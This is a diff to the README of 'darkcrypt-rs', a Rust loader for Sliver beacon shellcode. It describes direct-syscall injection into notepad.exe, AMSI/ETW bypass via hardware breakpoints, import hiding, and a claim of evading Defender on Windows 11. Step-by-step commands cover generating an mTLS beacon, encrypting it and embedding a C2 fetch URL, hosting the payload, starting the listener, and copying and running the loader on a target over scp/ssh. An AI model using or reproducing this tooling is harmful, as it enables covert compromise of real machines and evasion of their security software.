@@ -2,7 +2,7 @@
 
 # darkcrypt-rs
 
-**Rust port of darkcrypt. Direct syscalls, HWBP AMSI/ETW bypass, Win11 24H2. Cross-compiled from Linux via mingw-w64.**
+**Rust port of darkcrypt — `#![no_std]` + `#![no_main]`, cross-compiled from Linux via mingw-w64. Direct syscalls, HWBP AMSI/ETW silencing, runtime-loaded WinHTTP. Runs clean on Win11 24H2 under Defender RTP.**
 
 </div>
 
@@ -12,64 +12,56 @@
 
 ## What it does
 
-Reads an AES-256-CBC + HMAC-SHA256 payload from disk, verifies and decrypts it in memory with pure-Rust crypto (no `bcrypt.dll`), spawns a suspended `notepad.exe`, and dispatches the shellcode through a persistent RWX syscall trampoline (Halos Gate). ETW and AMSI are silenced via hardware breakpoints in both the loader and the beacon's host, with a third-APC that re-arms DR0 on `AmsiScanBuffer` inside the running beacon.
+Fetches an AES-256-CBC + HMAC-SHA256 payload (DCP1 wire format) over WinHTTP, decrypts it in memory with pure-Rust crypto (no `bcrypt.dll`), spawns a suspended `notepad.exe`, and dispatches the shellcode through a persistent RWX syscall trampoline (Halos Gate). Loader-side AMSI + ETW are silenced with vectored-handler hardware breakpoints; a third APC re-arms DR0 inside the beacon host.
 
-Build is `#![no_std]` + `#![no_main]`. No stdout — exit code signals state. **37.8 KB PE, `KERNEL32.dll` as the only import.**
+`winhttp.dll` is loaded at runtime via hash-resolved `LoadLibraryW` and all eight `WinHttp*` entry points come out of the shared DJB2 export cache, so the PE import table still lists `KERNEL32.dll` and nothing else.
+
+**37.8 KB PE, 8 imported names, 1 IOC finding (SHA-256 IV constants — RFC-6234 baseline).**
 
 ## Build
 
-```bash
-sudo pacman -S rustup           # or your distro's equivalent
-rustup target add x86_64-pc-windows-gnu
-# needs x86_64-w64-mingw32-gcc (already installed if you built darkcrypt C)
+Cross-compile from Linux:
 
-./scripts/build.sh              # drops artifacts/darkcrypt-rs.exe
+```bash
+rustup target add x86_64-pc-windows-gnu
+# plus x86_64-w64-mingw32-gcc from your package manager
+./scripts/build.sh                # drops artifacts/darkcrypt-rs.exe
 ```
+
+Or native on an x64 Windows host: `.\scripts\build.ps1`.
 
 IOC gate:
 
 ```bash
 python3 ../darkcrypt/tools/check_iocs.py artifacts/darkcrypt-rs.exe
-# expected: 1 finding (SHA-256 IV constants — RFC-6234, accepted baseline)
+# expected: 1 finding (SHA-256 IV constants, accepted baseline)
 ```
 
 ## Usage
 
-1. Generate a Sliver shellcode:
-   ```
+1. **Forge the payload** (reuses darkcrypt C's encoder — same wire format):
+   ```bash
    sliver > generate --mtls <c2>:8443 --os windows --arch amd64 --format shellcode \
                      --save /tmp/beacon.bin --shellcode-exitopt 3 --shellcode-entropy 3 --skip-symbols
+   ../darkcrypt/forge.sh /tmp/beacon.bin    # writes aes.encrypted + prints fresh keys
    ```
-2. Forge the payload (reuses darkcrypt C's encoder — same wire format):
+2. **Bake** the printed keys into `AES_KEY` / `MAC_KEY` in `src/main.rs`, and re-encode your fetch URL into `ENC_C2_URL` / `KEY_C2_URL` in `src/encoded_strings.rs` via `tools/xor_encode.py --mb-key-random 6 "<url>"`. Rebuild, re-gate.
+3. **Host the blob + open the listener:**
    ```bash
-   ../darkcrypt/forge.sh /tmp/beacon.bin
-   ```
-   Writes `aes.encrypted` and prints the fresh keys. Paste them into `AES_KEY` / `MAC_KEY` in `src/main.rs`.
-3. Re-bake `ENC_C2_URL` and `KEY_C2_URL` in `src/encoded_strings.rs` for your fetch URL via `tools/xor_encode.py --mb-key-random 6 "<url>"`. Then rebuild + re-gate.
-4. Host the blob and open the listener:
-   ```
-   python3 -m http.server 8080 --directory .      # serves aes.encrypted at /aes.encrypted
+   python3 -m http.server 8080 --directory .   # serves aes.encrypted at /aes.encrypted
    sliver > mtls -L 0.0.0.0 -l 8443
    ```
-5. Deliver + fire (no-arg run, loader fetches the hardcoded URL):
+4. **Deliver + fire** — HTTP pull (default) or disk drop:
    ```bash
+   # HTTP pull (no arg; loader fetches the baked C2 URL)
    scp artifacts/darkcrypt-rs.exe user@target:C:/Users/user/darkcrypt-rs.exe
    ssh user@target 'C:\Users\user\darkcrypt-rs.exe'
-   ```
-   `winhttp.dll` is loaded at runtime via hash-resolved `LoadLibraryW` and all eight `WinHttp*` entry points are resolved out of the shared DJB2 export cache, so the PE import table still lists only `KERNEL32.dll`.
 
-   Session lands on Sliver in ~1-2 seconds.
-
-   **Alternative — disk-based (scp the blob, pass the path):**
-   ```bash
-   scp aes.encrypted user@target:C:/Users/user/dc_payload.bin
+   # Disk drop (pass the blob path)
+   scp aes.encrypted              user@target:C:/Users/user/dc_payload.bin
    ssh user@target 'C:\Users\user\darkcrypt-rs.exe C:\Users\user\dc_payload.bin'
    ```
-
-## Modes
-
-- `darkcrypt-rs.exe` — fetch `C2_URL` over WinHTTP, verify + decrypt + inject.
-- `darkcrypt-rs.exe <path>` — read from disk, verify + decrypt + inject.
+   Session lands on Sliver in ~1-2 seconds either way.
 
 ## Exit codes
 
@@ -79,18 +71,18 @@ python3 ../darkcrypt/tools/check_iocs.py artifacts/darkcrypt-rs.exe
 0xDEADBEEF   panic
 ```
 
-## Gotchas
+## Notes
 
-- `notepad.exe` is the only reliable host — `RuntimeBroker.exe` dies in ~5s.
+- `notepad.exe` is the only reliable host — `RuntimeBroker.exe` dies in ~5 s.
 - The 1000 ms `io::sleep` between `ResumeThread` and `finish_amsi` is load-bearing. Never remove it.
-- Never export `RUSTFLAGS` when building — it replaces `[target.*].rustflags`. PE link args are in `build.rs` as `cargo:rustc-link-arg=` so they survive; the rest of config.toml doesn't.
+- Never export `RUSTFLAGS` when building — it replaces `[target.*].rustflags`. PE link args are in `build.rs` as `cargo:rustc-link-arg=` so they survive; the rest of `config.toml` doesn't.
 - Dev profile must `panic = "abort"` (already set) — else `cargo build` drags in `libgcc_eh`.
 - Start every run from a clean snapshot.
 
 ## Cross-port
 
-| Build          | Size    | Imports               | IOC | Win11 24H2 Defender |
-|----------------|---------|-----------------------|-----|---------------------|
-| darkcrypt (C)  | 62 KB   | kernel32, ntdll       | 0   | ✓                   |
-| darkcrypt-cs   | 37 KB   | n/a (.NET)            | n/a | ✓                   |
-| darkcrypt-rs   | 37.8 KB | KERNEL32 only, 8 names| 1   | ✓                   |
+| Build          | Size    | Imports                | IOC | Win11 24H2 Defender |
+|----------------|---------|------------------------|-----|---------------------|
+| darkcrypt (C)  | 62 KB   | kernel32, ntdll        | 0   | ✓                   |
+| darkcrypt-cs   | 37 KB   | n/a (.NET)             | n/a | ✓                   |
+| darkcrypt-rs   | 37.8 KB | KERNEL32 only, 8 names | 1   | ✓                   |
